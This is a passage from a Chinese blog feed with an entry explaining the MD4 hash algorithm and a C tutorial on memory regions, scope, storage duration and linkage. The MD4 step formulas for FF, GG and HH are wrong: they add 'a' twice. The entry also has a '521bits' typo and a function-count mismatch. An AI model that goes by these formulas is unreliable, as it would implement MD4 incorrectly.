href="https://www.rfc-editor.org/rfc/rfc6234">RFC 6234: US Secure Hash Algorithms (SHA and SHA-based HMAC and HKDF)</a></p>]]></content>
      
      
      <categories>
          
          <category> 散列算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD4</title>
      <link href="/2024adedb6b9443b/"/>
      <url>/2024adedb6b9443b/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>MD4</code>是一种广泛引用的密码散列函数,用于为任意长度的数据产生一个固定长<code>128bits(16 bytes)</code>的散列值,来确保信息传输的一致性.</p><p><code>MD4</code>由麻省理工学院教授Ronald Rivest设计于1990年,而后续被<code>MD5</code>所取代.</p><h1 id="算法过程">算法过程</h1><h2 id="1-数据填充">1.数据填充</h2><p><code>MD4</code>可以对任意长度的数据进行散列,在算法之前需要对数据进行填充,使其位长度(bits)对<code>512(64 bytes)</code>求余的结果为<code>448(56 bytes)</code>.即最后需要空出<code>64bits(8 bytes)</code>,这8字节用于填充长度信息,因此最终结果对齐到512bits.</p><p>填充步骤如下:</p><ol><li>在原始信息的末尾填充一个<code>1</code>和若干个<code>0</code>,直到满足上述求余结果.</li><li>在第<code>1</code>步结果的后面附加一个<code>64bits</code>长度的数据(其值为原始信息的长度信息,单位为<code>bit</code>),如果长度信息超过<code>64bits</code>,则取低64位.</li></ol><p>注意:</p><ol><li>填充数据应该使用<code>小端序</code>进行处理,包括原始数据和64bits的长度信息.</li><li>最终的结果是512bits对齐的,即每个分组为512bits.</li><li>后续说的<code>1字(1-word)</code>代表4字节,即32-bits.</li></ol><h2 id="2-初始化md缓冲区">2.初始化MD缓冲区</h2><p>MD4使用4个缓冲区,命名为<code>A</code>,<code>B</code>,<code>C</code>,<code>D</code>.每个缓冲区均为<code>32bits</code>,以<code>小端序</code>储存:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word A: <span class="number">01</span> <span class="number">23</span> <span class="number">45</span> <span class="number">67</span></span><br><span class="line">word B: <span class="number">89</span> ab cd ef</span><br><span class="line">word C: fe dc ba <span class="number">98</span></span><br><span class="line">word D: <span class="number">76</span> <span class="number">54</span> <span class="number">32</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p>由于以小端序存储,因此在C程序中应该为如下程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> A 0x67452301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> B 0xefcdab89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C 0x98badcfe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D 0x10325476</span></span><br></pre></td></tr></table></figure><h2 id="3-处理分组数据">3.处理分组数据</h2><p>每<code>521bits(即64-bytes/16-words)</code>数据为一组,每个分组单独进行处理.</p><p>注意:仍然以小端序进行处理.(?)</p><h3 id="三个辅助非线性函数f-g-h">三个辅助非线性函数F,G,H</h3><p>首先定义四个辅助函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F( X ,Y ,Z ) = ( X &amp; Y ) | ( (~X) &amp; Z )</span><br><span class="line"></span><br><span class="line">G( X ,Y ,Z ) = ( X &amp; Y ) | ( X &amp; Z ) | ( Y &amp; Z )</span><br><span class="line"></span><br><span class="line">H( X ,Y ,Z ) = X ^ Y ^ Z</span><br></pre></td></tr></table></figure><p>其中,<code>F</code>为&quot;如果X则Y,否则Z; <code>H</code>为&quot;诸位异或&quot;或称之为&quot;奇偶校验&quot;.</p><h3 id="三个函数ff-gg-hh">三个函数FF,GG,HH</h3><p>定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FF(a ,b ,c ,d ,Mi ,s ): a = a + ( (a + F(b,c,d) + Mi) &lt;&lt;&lt; s)</span><br><span class="line"></span><br><span class="line">GG(a ,b ,c ,d ,Mi ,s ): a = a + ( (a + G(b,c,d) + Mj + <span class="number">0x5A827999</span>) &lt;&lt;&lt; s)</span><br><span class="line"></span><br><span class="line">HH(a ,b ,c ,d ,Mi ,s ): a = a + ( (a + H(b,c,d) + Mj + <span class="number">0x6ED9EBA1</span>) &lt;&lt;&lt; s)</span><br></pre></td></tr></table></figure><p>其中,<code>&lt;&lt;&lt;</code>代表<code>循环左移</code>.</p><h3 id="主循环">主循环</h3><p>将每个分组(512-bits/64bytes)分为16个子分组(4-bytes),即<code>M[0...15]</code></p><p>首先需要将四个缓冲区<code>A,B,C,D</code>复制到另外的四个位置<code>AA,BB,CC,DD</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AA = A</span><br><span class="line">BB = B</span><br><span class="line">CC = C</span><br><span class="line">DD = D</span><br></pre></td></tr></table></figure><p>注意在第一个分组处理之前,<code>A,B,C,D</code>已被初始化.</p><p>主循环处理每个<code>16-WORDs</code>的分组,共有<code>三个</code>轮次(ROUND),每个轮次都很相似,执行<code>三轮</code>操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ROUND 1 */</span></span><br><span class="line">FF(A,B,C,D,M[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">1</span>],<span class="number">7</span>);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">2</span>],<span class="number">11</span>);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">3</span>],<span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">FF(A,B,C,D,M[<span class="number">4</span>],<span class="number">3</span>);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">5</span>],<span class="number">7</span>);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">6</span>],<span class="number">11</span>);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">7</span>],<span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">FF(A,B,C,D,M[<span class="number">8</span>],<span class="number">3</span>);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">9</span>],<span class="number">7</span>);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">10</span>],<span class="number">11</span>);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">11</span>],<span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">FF(A,B,C,D,M[<span class="number">12</span>],<span class="number">3</span>);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">13</span>],<span class="number">7</span>);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">14</span>],<span class="number">11</span>);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">15</span>],<span class="number">19</span>);</span><br><span class="line"><span class="comment">/* ROUND 2 */</span></span><br><span class="line">GG(A,B,C,D,M[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">4</span>],<span class="number">5</span>);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">8</span>],<span class="number">9</span>);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">12</span>],<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">GG(A,B,C,D,M[<span class="number">1</span>],<span class="number">3</span>);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">5</span>],<span class="number">5</span>);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">9</span>],<span class="number">9</span>);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">13</span>],<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">GG(A,B,C,D,M[<span class="number">2</span>],<span class="number">3</span>);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">6</span>],<span class="number">5</span>);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">10</span>],<span class="number">9</span>);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">14</span>],<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">GG(A,B,C,D,M[<span class="number">3</span>],<span class="number">3</span>);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">7</span>],<span class="number">5</span>);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">11</span>],<span class="number">9</span>);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">15</span>],<span class="number">13</span>);</span><br><span class="line"><span class="comment">/* ROUND 3 */</span></span><br><span class="line">HH(A,B,C,D,M[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">8</span>],<span class="number">9</span>);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">4</span>],<span class="number">11</span>);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">12</span>],<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">HH(A,B,C,D,M[<span class="number">2</span>],<span class="number">3</span>);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">10</span>],<span class="number">9</span>);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">6</span>],<span class="number">11</span>);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">14</span>],<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">HH(A,B,C,D,M[<span class="number">1</span>],<span class="number">3</span>);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">9</span>],<span class="number">9</span>);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">5</span>],<span class="number">11</span>);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">13</span>],<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">HH(A,B,C,D,M[<span class="number">3</span>],<span class="number">3</span>);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">11</span>],<span class="number">9</span>);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">7</span>],<span class="number">11</span>);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">15</span>],<span class="number">15</span>);</span><br></pre></td></tr></table></figure><p>然后,四个<code>缓冲区(寄存器): A,B,C,D</code>增加其原来的值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A = A + AA</span><br><span class="line">B = B + BB</span><br><span class="line">C = C + CC</span><br><span class="line">D = D + DD</span><br></pre></td></tr></table></figure><p>到此,一轮主循环结束,如此逐个使用每个<code>16-WORDs</code>分组执行以上算法.</p><h3 id="输出结果">输出结果</h3><p>最终输出的结果即为四个缓冲区的值<code>A,B,C,D</code>的级联,共<code>128-bits</code>,一般将其转换为16进制表示.<br>注意: 输出时,从A的低字节开始,到D的高字节结束,即<code>小端序</code>.(?)</p><h1 id="参阅">参阅</h1><p><a href="https://www.rfc-editor.org/rfc/rfc1320">RFC 1320: The MD4 Message-Digest Algorithm</a></p>]]></content>
      
      
      <categories>
          
          <category> 散列算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-15_2-存储期,作用域与链接</title>
      <link href="/20249964b6b49f5c/"/>
      <url>/20249964b6b49f5c/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li>指针</li><li>动态内存管理</li></ol><h1 id="c语言内存模型简介">C语言内存模型简介</h1><p>考虑到不同实现的差异,这里主要描述的是C程序的<code>内存模型</code>,而不是具体操作系统(具体实现)的内存模型(例如ELF的内存分区).</p><p>C语言的内存模型大致分为如下几块:<code>栈区</code>,<code>堆区</code>,<code>全局/静态存储区</code>,<code>常量区</code>,<code>代码区</code>.<br>需要注意的是: 由特定操作系统/编译器的实现不同,具体实际的内存分区也是有所不同的,以下讲解的分区,是基于C语言层面的内容,而和真正环境下载入内存中的程序结构有所差异. 在编写C语言代码的时候,我们一般只需要关心这几个层面的分区即可.</p><h2 id="栈区">栈区</h2><p>我们知道,一个C程序有着许许多多的函数,而函数中有许多<code>局部变量</code>,这些局部变量就存储在<code>栈区</code>中.</p><p>当一个函数被<code>调用</code>时,程序就会为这个函数创建一个<code>栈帧</code>(初学者无需太关注,了解即可),这个栈帧中的内存区域就用于存储各个局部变量/函数参数等.<br>而当这个函数<code>返回</code>时,即&quot;退出&quot;这个函数,此时这个<code>栈帧</code>就会被释放掉,对应地,里面的局部变量也会被释放掉.这就是为什么&quot;一个函数的局部变量只能在该函数内部访问&quot;的原因.</p><p>当然,一个函数可能有一些<code>形参</code>(如果不知道这是什么请复习&quot;函数&quot;一章),这些形参的处理方式和普通的局部变量有所不同. 但是总之,他们在使用上和局部变量没什么两样,他们同样是属于某个<code>函数栈帧</code>,也就是说,他们也是在<code>栈区</code>中分配的.</p><p>此外,栈区的大小也是有限的,根据编译器的不同而有所不同,当然也可以在编译的时候进行指定. 例如Linux中(64位)默认栈的大小为10MB等.</p><h2 id="堆区">堆区</h2><p>根据&quot;15_1&quot;一章的学习,我们知道C语言中所谓的&quot;动态内存&quot;,实际上就是<code>堆内存</code>,他们是在<code>堆区</code>中分配的.</p><p>堆区与栈区不同,他的内存非常大,总大小为机器的虚拟内存大小. 其中的内存需要手动进行申请,并且在使用后手动释放,如果未手动释放,则在程序结束后由操作系统回收.<br>堆内存一旦分配,在整个程序运行期间都是有效的,而不会像栈内存一样在函数执行结束即销毁.</p><h2 id="全局-静态存储区">全局/静态存储区</h2><p>我们后面会学习到<code>static</code>关键字,该关键字可以在函数中声明静态局部变量.<br>与普通的局部变量不同,静态局部变量不会随着函数执行结束而销毁,而是仍然保留其值,在下次调用这个函数时仍然生效,不会重新分配.</p><p>静态存储区内的变量在程序<code>编译阶段</code>已经分配好内存空间并<code>初始化</code>,主要存放静态变量和全局变量.</p><h2 id="常量区">常量区</h2><p>这里会存储一些程序中使用到的<code>常量</code>,<code>字面量</code>和<code>const变量</code>.</p><ul><li><p>所谓<code>常量</code>,即是一些整数,浮点数,字符,例如<code>1</code>,<code>3.14</code>,<code>a</code>这些,它们都是常量.</p></li><li><p>所谓<code>字面量</code>,大多数为<code>字符串字面量</code>,例如<code>&quot;hello world&quot;</code>等,这些直接写入到程序中的字符串就是字符串字面量.<br>而另一种字面量,则是<code>复合字面量</code>,简单地说就是一个指定类型的无名对象,例如一个无名的结构体对象.(关于这些细节详见<a href="https://zh.cppreference.com/w/c/language/expressions#.E5.B8.B8.E9.87.8F.E5.8F.8A.E5.AD.97.E9.9D.A2.E9.87.8F">Cppreference文档</a>)</p></li><li><p><code>const变量</code>,如前所述,则为由const修饰的变量,其值是不可变的,因此往往视为&quot;常量&quot;.</p></li></ul><p>它们被存储于<code>常量区</code>,C程序可以直接访问并使用它们.</p><p>必须注意的是,这种存储并不是绝对的,例如简单的整数会直接硬编码到汇编指令中,而根本没必要单独存储;再例如简单<code>const变量</code>,编译器往往会将其直接进行优化,硬编码到程序指令中,而不会单独进行存储.</p><p>此外,所谓的<code>常量区</code>是取决于具体实现的,例如在Linux系统中,常量可能会被存储在只读内存段<code>.rodata</code>中;而在Windows中,常量则存储于<code>.rdata</code>中. 当然,很多简单的整数,字符常量往往会直接硬编码到指令中.</p><h2 id="代码区">代码区</h2><p>代码区中存放的就是我们的程序代码,编译器编译好的二进制程序指令就存放在此处. 当我们的程序开始执行时,程序会从代码区的一个特定位置开始,按照代码逻辑顺序逐步执行,并且根据逻辑需要去访问特定的内存数据.</p><p>学习过<code>函数指针</code>后,我们知道,C语言的函数是可以寻址的,实际上,函数指针指向的就是内存中的一段代码,他们就是存储在<code>代码区</code>的. 在实际的操作系统中,<code>代码区</code>往往被实现为<code>.text</code>段.</p><h1 id="c语言的对象">C语言的对象</h1><p>C语言中,<code>对象</code>指的是执行环境中<strong>数据存储</strong>的一个区域, 其内容可以表示<code>值</code>.<br>而<code>值</code>指的是对象的内容转译为特定<code>类型</code>时的含义.</p><p>每个对象拥有如下的信息;</p><ul><li>大小: 一个对象的大小即为其占用的字节数, 可以使用<code>sizeof</code>确定</li><li>对齐要求: C11起可以使用<code>_Alignof</code>确定</li><li>存储期: 包含有<strong>自动</strong>, <strong>静态</strong>, <strong>分配</strong>, <strong>线程局域</strong></li><li>生存期: 等于<code>存储期</code>或临时</li><li>有效类型: 即该对象以何种类型解释为合法, 例如变量的类型.</li><li>值: 其值可以为不确定的</li><li>可选项: 表示该对象的<code>标识符</code></li></ul><p>一个对象由<code>声明</code>, <code>分配函数</code>, <code>字符串字面量</code>, <code>复合字面量</code>及<code>返回拥有数组类型的结构体或联合体的非左值表达式</code>创建</p><h1 id="作用域">作用域</h1><p>C语言的每个<code>标识符</code>都只能在一些可能不连续的部分可见(即可使用),这些部分被称为其<code>作用域</code>.<br>注: 在作用域内,标识符仅在不同<a href="https://zh.cppreference.com/w/c/language/name_space" title="c/language/name space">命名空间</a>中, 才可以指代多于一个实体.</p><p>C语言拥有4种作用域:</p><ul><li>块作用域</li><li>文件作用域</li><li>函数作用域</li><li>函数原型作用域</li></ul><h2 id="块作用域">块作用域</h2><p><code>块作用域</code>是任何在复合语句, 包含函数体(或出现于if,switch,for,while或do-while语句中(C99起))的任何表达式, 声明或语句, 或在函数定义内的参数列表中声明的标识符的作用域.</p><p>在声明点开始,在声明于其中的块或语句的结尾结束.<br>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span> &#123;                           <span class="comment">// 函数参数 &#x27;n&#x27; 的作用域开始</span></span><br><span class="line">                                      <span class="comment">// 函数体开始</span></span><br><span class="line">++n;                                  <span class="comment">// &#x27;n&#x27; 在作用域中并指代函数参数</span></span><br><span class="line"><span class="comment">// int n = 2;                         // 错误：不能在同一作用域重声明标识符</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">10</span>; ++n) &#123; <span class="comment">// 循环局域的 &#x27;n&#x27; 的作用域开始</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);                <span class="comment">// 打印 0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line">&#125; <span class="comment">// 循环局域的 &#x27;n&#x27; 的作用域结束</span></span><br><span class="line">                                      <span class="comment">// 函数参数 &#x27;n&#x27; 回到作用域</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);                    <span class="comment">// 打印参数的值</span></span><br><span class="line">&#125;                                         <span class="comment">// 函数参数 &#x27;n&#x27; 的作用域结束</span></span><br><span class="line"><span class="type">int</span> a = n;                                <span class="comment">// 错误：名称 &#x27;n&#x27; 不在作用域中</span></span><br></pre></td></tr></table></figure><p>如果您学习的是C89标准,那么必须注意下面这个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span>a, b&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">different</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="keyword">enum</span> &#123;b, a&#125;) != <span class="keyword">sizeof</span>(<span class="type">int</span>))</span><br><span class="line">        <span class="keyword">return</span> a; <span class="comment">// a == 1</span></span><br><span class="line">    <span class="keyword">return</span> b; <span class="comment">// C89 中 b == 0，C99 中 b == 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在C99之前,选择和迭代语句不建立其自身的块作用域,因此,上面的代码在C89时<strong>b</strong>的值为0,即if语句中的枚举类型; 而在C99时<strong>b</strong>的值为1.</p><p>块作用域变量默认<code>无链接</code>(见下)并拥有<code>自动存储期</code>(见下), 需要注意的是VLA局部变量的存储期在进入块时开始,但在见到声明之前,该变量不在作用域中且不能访问.</p><h2 id="文件作用域">文件作用域</h2><p>在任何块或形参列表外声明的任何标识符的作用域为<code>文件作用域</code>, 在声明点开始, <strong>翻译单元</strong>尾结束.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i; <span class="comment">// i 的作用域开始</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> a)</span> &#123; <span class="keyword">return</span> a; &#125; <span class="comment">// g 的作用域开始（注意 &quot;a&quot; 拥有块作用域）</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    i = g(<span class="number">2</span>); <span class="comment">// i 和 g 在作用域中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件作用域的标识符默认拥有<code>外部链接</code>和<code>静态存储期</code>.</p><h2 id="函数作用域">函数作用域</h2><p>声明于函数内部的<strong>标号</strong>(且只有标号)在该函数中的所有位置都在<code>函数作用域</code>内.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   &#123;   </span><br><span class="line">       <span class="keyword">goto</span> label; <span class="comment">// label 在作用域中，尽管之后才声明</span></span><br><span class="line">label:;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">goto</span> label; <span class="comment">// 标号忽略块作用域</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">goto</span> label; <span class="comment">// 错误：g() 中 label 不在作用域中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数原型作用域">函数原型作用域</h2><p><strong>非函数定义</strong>的<strong>函数声明</strong>的形参列表中引入的名称的作用域为<code>函数原型作用域</code>, 在函数<a href="https://zh.cppreference.com/w/c/language/declarations" title="c/language/declarations">声明器</a>的结尾结束.<br>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> a[n])</span>; <span class="comment">// n 在作用域中并指代第一形参</span></span><br></pre></td></tr></table></figure><p>注意: 若声明中有多个或嵌套声明器, 则作用域在最近的外围函数声明器的结尾结束:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span> <span class="params">( <span class="comment">// 函数名 &#x27;f&#x27; 在文件作用域</span></span></span><br><span class="line"><span class="params">    <span class="type">long</span> <span class="type">double</span> f,            <span class="comment">// 标识符 &#x27;f&#x27; 现在在作用域中，隐藏文件作用域的 &#x27;f&#x27;</span></span></span><br><span class="line"><span class="params">    <span class="type">char</span> (**a)[<span class="number">10</span> * <span class="keyword">sizeof</span> f] <span class="comment">// &#x27;f&#x27; 指代第一形参，它在作用域中</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span> n = <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">int</span> (*(*g)(<span class="type">int</span> n))[n]; <span class="comment">// 函数形参 &#x27;n&#x27; 的作用域在其函数声明符的结尾结束</span></span><br><span class="line">                       <span class="comment">// 数组声明器中，全局 n 在作用域</span></span><br><span class="line"><span class="comment">// （这声明指向返回 3 个 int 的数组的指针的函数的指针）</span></span><br></pre></td></tr></table></figure><p>此外, 作用域是可以嵌套的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此处的命名空间为通常标识符。</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> a;   <span class="comment">// 名称 a 的文件作用域始于此</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;             <span class="comment">// 名称 a 的块作用域始于此；隐藏文件作用域的 a</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">2</span>;         <span class="comment">// 内层 a 的作用域始于此，隐藏外层 a </span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a); <span class="comment">// 内层 a 在作用域中，打印 2</span></span><br><span class="line">    &#125;                      <span class="comment">// 内层 a 的块作用域终于此</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);     <span class="comment">// 外层 a 在作用域中，打印 1</span></span><br><span class="line">&#125;                          <span class="comment">// 外层 a 的作用域终于此</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> a)</span>;             <span class="comment">// 名称 a 拥有函数原型作用域；隐藏文件作用域的 a</span></span><br></pre></td></tr></table></figure><p>注:</p><ul><li>关于<code>声明点</code>,参见<a href="https://zh.cppreference.com/w/c/language/scope">作用域 - cppreference.com</a></li><li>作用域也与<code>命名空间</code>有关,参见<a href="https://zh.cppreference.com/w/c/language/name_space">查找与命名空间 - cppreference.com</a></li></ul><h1 id="存储期">存储期</h1><p><code>存储期(storage duration)</code>描述(限制)了<code>对象</code>的生存期, C语言有四种存储期:</p><ul><li><code>自动</code>存储期: 当进入对象所声明于其中的<code>块</code>时分配其存储, 而当退出该块时(return, goto, 抵达结尾)解分配存储.<br>如果该块是递归进入的, 那么每层递归都会进行新的分配.<br>一个例外是, C99起的<code>VLA</code>是在声明时分配的, 而非在块入口分配.</li><li><code>静态</code>存储期: 该存储期是整个程序的执行过程, 只有在main函数执行之前进行一次初始化.<br>所有声明为<code>static</code>对象和所有带内部和外部链接且不声明为<code>_Thread_local</code>(C23前)的对象都拥有次存储期.</li><li><code>分配</code>存储期: 使用动态分配函数进行分配和解分配的堆内存拥有此存储期.</li><li><code>线程</code>存储期: 该存储期是创建对象的<code>线程</code>的整个执行过程. 在启动线程时初始化存储于对象的值.</li></ul><p>最常见的是前三种存储期, 简单来讲, <code>自动</code>存储期对应了函数/块中的局部变量, 而<code>静态</code>存储期对应了static修饰的变量, <code>分配</code>存储期则对应了我们使用malloc等函数分配的堆内存空间.</p><h1 id="链接">链接</h1><p><code>链接</code>指的是标识符(变量或函数)可从其他作用域指代的能力.<br>C语言有三种链接: 外部链接, 内部链接或无链接.</p><ul><li>无链接: 所有的函数形参以及非<code>extern</code>的块作用域变量(包括声明为<code>static</code>的变量)都为<code>无链接</code>.</li><li>内部链接: 能够在一个<code>翻译单元</code>的所有作用域指代的标识符具有<code>内部链接</code>, 